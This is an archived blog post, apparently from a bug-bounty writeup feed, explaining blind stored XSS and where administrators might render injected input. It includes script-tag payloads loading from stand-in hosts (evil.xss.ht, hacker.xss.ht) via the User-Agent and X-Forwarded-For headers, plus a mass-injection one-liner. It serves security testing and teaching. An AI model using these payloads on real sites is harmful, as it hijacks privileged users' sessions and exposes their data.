# How to Find Blind XSS and Attack scenarios with payloads

- **Source URL:** https://akash-venky091.medium.com/how-to-find-blind-xss-and-attack-scenarios-with-payloads-9312fe19f75f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230320161825/https://akash-venky091.medium.com/how-to-find-blind-xss-and-attack-scenarios-with-payloads-9312fe19f75f?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2010 (id 2010)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How to Find Blind XSS and Attack scenarios with payloads

What is Blind XSS

Blind XSS are also Stored XSS usually They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application.

You have no idea where your malicious scripts are going to end up. Truly speaking, You don’t even know whether your malicious script or payload will execute or when it will execute.

**Examples:**

Scenario 1:

Consider a simple scenario. You are putting XSS payloads in an input field, but nothing happens on screen. Now, what happens is that the admin of the application is getting the same input directly and your payload gets executed there(i.e on his account).

Here the real bug hunter will not come to know the presence of blind xss untill something pop ups gets reflected. But at the backend the inserted payload gets executed at the admin level of application and Thus leads to BLIND XSS.

Scenario 2:

We can generally replace my User-Agent \[*Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0*\] with script \[*“>\<script src=https://evil.xss.ht>\</script>*\]. Use the User-Agent Switcher extension in Firefox to change or manipulate your user-agent.

Scenario 3 at **Input Fields :**

lets consider an application that manages the inventory of an online shop. here, the dealers enter the information of different products that are stored in a database server. The same database is also used by an online shop application, which is exposed to the internet for all the customers and needs to read the product information from the initial database.

Now as a attacker If a user injects a malicious string into the internal application, it is not important if the online shop has properly implemented input validation controls, as the information in the store is read from the same database, so the shop will show the attack. The payloads inserted by the users are getting stored at the DB of application where its gets executed.

Scenario 4 at **Feedback Forms :**

Feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed.

Scenario 5 **Exception Handlers** :

Another example of Blind XSS attacks is with logging solutions such as exception handlers. The attacker can use the API of the logger, to log some malicious code instead of an error. In the dashboard of the exception handling solution, where the logged errors are displayed, the malicious code will be rendered and executed.

Scenario 6 **Chat Forum:**

Attackers can place the malicious scripts within the topic title in a forum or chat forum board. Again, most commonly, the server will save their post to a database, and the stored information can get exposed to other viewers, as the moderators over some time.

Here, the script may get clean when delivered to normal users, which will disable the malicious code. However, when a moderator of the forum will load a forum management web page, like a thread popularity report, for example, the malicious topic titles may be loaded and consequently, the attacker’s script would be executed, calling back with stolen information, redirecting the user or cause a denial of service attacks by for example calling code within the admin interface that stops the forum. Typical user targets are moderators of forums or chat forum boards, who load forum content from management web sessions to perform administrative tasks and the aim is again, security-related.

Scenario 7: Custom Payload for Blind XSS through X-forwarded host:

subfinder -d target.com gau | bxss -payload ‘“>\<script src=https://hacker.xss.ht>\</script>’ -header “X-Forwarded-For”

Scenario 8: Also Blind XSS Can be detected by “ACUMONITOR” [https://www.acunetix.com/vulnerability-scanner/acumonitor-technology/](https://web.archive.org/web/20230320161825/https://www.acunetix.com/vulnerability-scanner/acumonitor-technology/)

Also FYR more exposure to Blind XSS, just use this Google Dork **site:hackerone.com blind xss** and you will get the full list of publicly disclosed reports on Hackerone,Medium writeups and many more articles.

# Where to look for Blind XSS?

You should always put Blind XSS payloads in places, where you are certain that an admin or another user of higher privileges.such as below points. Thinking logically, a normal user of the application won’t review your feedback but it will most probably be reviewed by an admin or a team member. So that’s a nice place for a little surprise.

Few Noted places below to find as input field to insert your weapons (Payloads)

1. Review forms
2. Contact Us pages
3. Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
4. Address fields of e-commerce sites
5. First or Last Name field while doing Credit Card Payments
6. Set User-Agent to a Blind XSS payload.
7. WordPress Plugin ([Count per Day](https://web.archive.org/web/20230320161825/http://wordpress.org/plugins/count-per-day/) is Vulnerable for Blind XSS)
8. Login Pages/Registration pages (“\<script>alert(“YOUR ADMINISTRATIVE INTERFACE IS HACKED!”);\</script>”)
9. User Agent/Host Headers
10. Exception handlers
11. Chat applications / forums
12. Customer ticket applications
13. **Any application that requires user moderation and admin/Super Admin verifications**

# How to find Blind XSS and what are the tools that can be used to achive this ?

Finding Blind XSS isn’t that hard as it sounds and sometimes putting your payloads everywhere can work like a charm. But let’s see how to approach this methodically.

There are Few tools Openly available for detection of Blind XSS, such as XSS hunter,Burpsuite,OwaspZapScanner etc which makes our work easier.

# Suggestions are most welcomed,

*Please write a mail to Akash.venky091@gmail.com, Also you can follow me here for more updates on Security, Ethical hacking at Akash Venky or contact me @ https://www.linkedin.com/in/akash-h-c-4a4090a7/*
